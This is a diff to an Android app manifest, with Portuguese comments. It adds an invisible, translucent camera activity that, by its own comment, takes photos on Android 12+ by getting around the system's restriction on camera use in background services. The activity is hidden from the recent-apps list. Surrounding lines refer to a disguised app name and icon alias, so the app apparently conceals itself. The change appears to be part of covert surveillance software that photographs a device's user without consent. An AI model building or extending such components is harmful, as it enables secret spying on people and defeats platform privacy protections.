@@ -56,6 +56,15 @@
             android:label="@string/disfarce_nome"
             android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar" />
 
+        <!-- Activity invisível para tirar fotos no Android 12+ (contorna restrição de câmara em serviços). -->
+        <activity
+            android:name=".CameraActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:screenOrientation="locked" />
+
         <!-- Ícone normal (FusãoTechX). -->
         <activity-alias
             android:name="com.fusaotech.studio.AliasNormal"
